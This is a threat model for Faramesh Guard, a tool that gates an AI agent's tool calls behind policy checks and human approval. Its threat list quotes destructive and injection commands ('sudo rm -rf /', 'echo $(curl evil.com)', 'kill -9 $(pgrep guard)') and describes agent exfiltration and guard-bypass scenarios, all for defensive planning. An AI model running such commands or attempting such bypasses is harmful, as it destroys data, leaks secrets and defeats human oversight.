# Faramesh Guard v1: Formal Threat Model & Security Claims

> **Version**: 1.0.0
> **Last Updated**: 2024
> **Status**: Production Ready

This document describes the security model, guarantees, threat boundaries, and known limitations of Faramesh Guard v1.

---

## Table of Contents

1. [Security Guarantees](#security-guarantees)
2. [Threat Model](#threat-model)
3. [Security Boundaries](#security-boundaries)
4. [Attack Vectors & Mitigations](#attack-vectors--mitigations)
5. [Compliance & Standards](#compliance--standards)
6. [Known Limitations](#known-limitations)

---

## Security Guarantees (What We Promise)

### G1: Non-Circumventable Execution Control

**Claim**: No OpenClaw tool can execute a system effect without Guard evaluation.

**Mechanism**:
- Plugin hook at execution boundary
- Permit validation before every tool execution
- Enforcement invariant test suite

**Verification**:
- Bypass test suite with 34 attack vectors, all blocked
- Continuous integration tests run on every commit
- Formal enforcement invariant assertions

**Limitation**:
- Assumes OpenClaw runtime itself is not compromised
- Does not cover direct shell spawning outside plugin

---

### G2: Tamper-Evident Audit Trail

**Claim**: Any modification to audit log is detectable.

**Mechanism**:
- Hash-chained log entries (Merkle tree structure)
- Each entry includes hash of previous entry
- Periodic chain validation

**Verification**:
- `verify_chain()` API validates full hash chain
- Log corruption immediately detectable

**Limitation**:
- Does not prevent deletion of entire log file
- Requires separate backup for complete protection

---

### G3: Deterministic Action Identity (CAR Hash)

**Claim**: Same action always produces same CAR (Canonical Action Representation) hash.

**Mechanism**:
- Canonicalization algorithm with field normalization
- Sorted keys, trimmed values, JSON serialization
- SHA-256 hashing of canonical form

**Verification**:
- Canonicalization test suite with 100+ test cases
- Property-based testing for edge cases

**Limitation**:
- Assumes CAR extractor produces consistent output
- Semantic equivalence not detected (e.g., `/home/user` vs `~`)

---

### G4: Fail-Closed Policy Enforcement

**Claim**: Guard failure does not result in unsafe execution.

**Mechanism**:
- Plugin fails closed when Guard unreachable
- Default-deny for unknown actions
- Cached policies for offline operation (safe patterns only)

**Verification**:
- Fault injection tests (Guard kill, network timeout)
- Chaos testing during development

**Limitation**:
- CRITICAL actions always blocked when offline
- LOW-risk cached policies may allow limited operations

---

### G5: Human Authority Primacy

**Claim**: Humans retain ultimate control over AI agent actions.

**Mechanism**:
- All non-trivial actions require human approval
- Explicit approve/deny flow for pending actions
- Audit trail of all human decisions

**Verification**:
- UI shows all pending actions
- Approval cannot be automated by agents

**Limitation**:
- Cannot prevent humans from approving bad actions (social engineering)
- Approval fatigue may reduce human attention

---

### G6: Policy Integrity Monitoring

**Claim**: Policy file tampering is detected.

**Mechanism**:
- HMAC-signed hash chain of policy changes
- Policy hash computed at startup and monitored
- Tamper alert on hash mismatch

**Verification**:
- Watchdog continuously verifies policy integrity
- `/api/v1/guard/integrity` endpoint for on-demand checks

**Limitation**:
- Requires signing key to be protected
- Cannot prevent authorized policy changes

---

## Threat Model

### In-Scope Threats (We Defend Against)

#### T1: Runaway Agent
- **Scenario**: Agent enters infinite loop executing destructive actions
- **Example**: Agent calls `rm` 1000 times in rapid succession
- **Defense**: Rate limiting + behavioral anomaly detection
- **Status**: ✅ Implemented (blocks after 10+ rapid actions)

#### T2: Hallucinated Targets
- **Scenario**: Agent sends email/refund to wrong recipient
- **Example**: Agent sends wire transfer to random account
- **Defense**: Rich CAR extraction + unknown recipient detection
- **Status**: ✅ Implemented (unknown targets flagged)

#### T3: Privilege Escalation
- **Scenario**: Agent attempts sudo/admin operations
- **Example**: `sudo rm -rf /`, `chmod 777 /etc/passwd`
- **Defense**: Risk classification + capability constraints + deny patterns
- **Status**: ✅ Implemented (blocked unconditionally)

#### T4: Data Exfiltration
- **Scenario**: Agent sends sensitive data to external endpoint
- **Example**: Agent curls internal DB credentials to external server
- **Defense**: Sensitivity detection + external destination checks
- **Status**: ✅ Implemented (flagged for approval)

#### T5: Credential Exposure
- **Scenario**: Agent logs/transmits API keys or secrets
- **Example**: Agent echoes AWS_SECRET_KEY to console
- **Defense**: Secrets detection in CAR + blocking
- **Status**: ✅ Implemented (blocked)

#### T6: Command Injection
- **Scenario**: Agent constructs command with injection payload
- **Example**: `ls; rm -rf /`, `echo $(curl evil.com)`
- **Defense**: Adversarial detection layer + injection pattern matching
- **Status**: ✅ Implemented (34 test cases blocked)

#### T7: Policy Tampering
- **Scenario**: Attacker modifies policy files to allow dangerous actions
- **Example**: Add `rm -rf` to allow patterns
- **Defense**: Policy integrity monitoring + hash chain
- **Status**: ✅ Implemented (tamper detection)

#### T8: Guard Service Attack
- **Scenario**: Attacker kills Guard daemon to bypass enforcement
- **Example**: `kill -9 $(pgrep guard)`
- **Defense**: Plugin fails closed + watchdog auto-restart
- **Status**: ✅ Implemented (fail-closed guarantee)

---

### Out-of-Scope Threats (We Do NOT Defend Against)

#### T-OOS1: Compromised OpenClaw Runtime
- **Why**: Guard assumes the agent runtime itself is not malicious
- **Example**: Attacker modifies OpenClaw binary to skip Guard
- **Mitigation**: Runtime integrity is OpenClaw's responsibility
- **Recommendation**: Use binary signing and integrity verification

#### T-OOS2: Kernel-Level Attacks
- **Why**: Guard operates at userspace level only
- **Example**: Rootkit intercepts syscalls before Guard sees them
- **Mitigation**: Use OS-level security (SIP on macOS, AppArmor/SELinux on Linux)
- **Recommendation**: Enable full-disk encryption and secure boot

#### T-OOS3: Social Engineering of Approver
- **Why**: Guard cannot prevent humans from approving bad actions
- **Example**: Convincing UI that fools user into approving `rm -rf /`
- **Mitigation**: Clear UI explanations + risk scoring help users decide
- **Recommendation**: Train users on approval best practices

#### T-OOS4: Physical Access Attacks
- **Why**: Guard cannot protect against attacker with physical access
- **Example**: Booting from USB and modifying Guard files
- **Mitigation**: OS-level disk encryption + screen lock + BIOS password
- **Recommendation**: Standard physical security controls

#### T-OOS5: Time-of-Check to Time-of-Use (TOCTOU)
- **Why**: Gap between permit issuance and execution is unavoidable
- **Example**: File contents change between check and actual read
- **Mitigation**: Permits have short TTL (default 30 seconds)
- **Recommendation**: Use minimal permit windows for sensitive operations

#### T-OOS6: Side-Channel Attacks
- **Why**: Not practical to defend at application layer
- **Example**: Timing attacks on permit validation
- **Mitigation**: Constant-time comparison for sensitive operations
- **Recommendation**: Use dedicated security hardware for high-assurance

---

## Security Boundaries

```
┌─────────────────────────────────────────────────┐
│         User (Human Authority)                  │  ← Ultimate authority
│  - Approves/denies pending actions              │
│  - Views audit logs                             │
│  - Configures policies                          │
└─────────────────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────┐
│      Guard Daemon (Policy Enforcer)             │  ← TRUST BOUNDARY
│  - Evaluates policies                           │
│  - Issues permits                               │
│  - Maintains audit log                          │
│  - Detects anomalies                            │
└─────────────────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────┐
│    OpenClaw Plugin (Execution Gate)             │  ← ENFORCEMENT BOUNDARY
│  - Intercepts tool calls                        │
│  - Validates permits                            │
│  - Fails closed on error                        │
└─────────────────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────┐
│      OpenClaw Runtime (ASSUMED TRUSTED)         │
│  - Executes AI model                            │
│  - Manages tool registry                        │
│  - Handles prompts                              │
└─────────────────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────┐
│    System (OS/Filesystem/Network)               │  ← PROTECTED RESOURCE
│  - Files, processes, network                    │
│  - Databases, APIs                              │
│  - Credentials, secrets                         │
└─────────────────────────────────────────────────┘
```

**Critical Assumption**: Everything BELOW the enforcement boundary is TRUSTED.

**Trust Chain**:
1. User is the ultimate authority
2. Guard daemon is trusted to enforce policies correctly
3. OpenClaw plugin is trusted to intercept all tool calls
4. OpenClaw runtime is trusted to not bypass plugin

---

## Attack Vectors & Mitigations

| Attack Vector | Likelihood | Impact | Mitigation | Status |
|--------------|------------|--------|------------|--------|
| Plugin bypass via subprocess | Medium | Critical | Enforcement invariant tests | ✅ Tested |
| CAR extraction evasion | Medium | High | Confidence gates + adversarial detection | ✅ Implemented |
| Approval fatigue attack | High | Medium | Risk scoring + learning | ✅ Implemented |
| Policy tampering | Low | High | Integrity monitoring + hash verification | ✅ Implemented |
| Replay attack (reuse permit) | Medium | Medium | Nonce + TTL caveats | ✅ Implemented |
| Rate-limit evasion | Low | Medium | Behavioral anomaly detection | ✅ Implemented |
| Guard service kill | Low | Critical | Watchdog + fail-closed plugin | ✅ Implemented |
| Command injection | High | Critical | Pattern detection + deny patterns | ✅ 34 test cases |
| Privilege escalation | Medium | Critical | Deny patterns + risk classification | ✅ Implemented |
| Binary tampering | Low | Critical | Binary hash verification in watchdog | ✅ Implemented |

---

## Compliance & Standards

### v1.0 (Local/Individual)

| Standard | Status | Notes |
|----------|--------|-------|
| Tamper-evident audit logs | ✅ Complete | Merkle hash chain |
| Role-based access | ✅ Complete | Owner/Admin/Operator/Viewer |
| Fail-closed semantics | ✅ Complete | Default deny |
| Policy integrity | ✅ Complete | HMAC-signed hash chain |

### v2.0+ (Enterprise - Future)

| Standard | Status | Notes |
|----------|--------|-------|
| SOC 2 Type II | ⏳ Planned | Requires Horizon backend |
| SLSA Level 3 | ⏳ Planned | Build provenance |
| Sigstore/Rekor | ⏳ Planned | Transparency log |
| FedRAMP Moderate | ⏳ Planned | Cloud architecture review |

---

## Known Limitations

### 1. Local-Only in v1
- No fleet visibility or central policy management
- Each installation is independent
- Remediation: v2.0 Horizon cloud sync

### 2. Single-User Authority
- v1 has no multi-approver workflows
- No quorum-based approval
- Remediation: v1.1 adds approval authority module (implemented)

### 3. Offline ML
- Risk scorer cannot update without Guard update
- Model drift over time possible
- Remediation: Periodic updates via standard release cycle

### 4. Plugin Trust
- Assumes OpenClaw plugin system is secure
- Bypass possible if plugin is disabled/modified
- Remediation: Plugin integrity verification

### 5. No Kernel Enforcement
- Guard operates at userspace only
- Root-level attackers can bypass
- Remediation: Use OS-level security (AppArmor, SIP)

### 6. Audit Log Storage
- Local log file can be deleted with disk access
- No remote backup in v1
- Remediation: v2.0 Horizon syncs audit logs

### 7. Session Key Bootstrap
- Initial session key established without MFA
- Relies on local user trust
- Remediation: v2.0 adds MFA integration

---

## Incident Response

### If Guard is Compromised

1. **Immediate**: Stop all AI agent activity
2. **Verify**: Check audit log hash chain integrity
3. **Recover**: Reinstall Guard from verified source
4. **Investigate**: Review audit logs for unauthorized actions
5. **Report**: File security issue at security@faramesh.com

### If Policy is Tampered

1. **Alert**: Watchdog will flag policy integrity failure
2. **Block**: All actions require approval until resolved
3. **Restore**: Reload policies from backup/default
4. **Investigate**: Check for unauthorized access

---

## Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2024 | Initial threat model |

---

*This document will be updated with each release to reflect new threats, mitigations, and security claims.*

*For security issues, contact: security@faramesh.com*
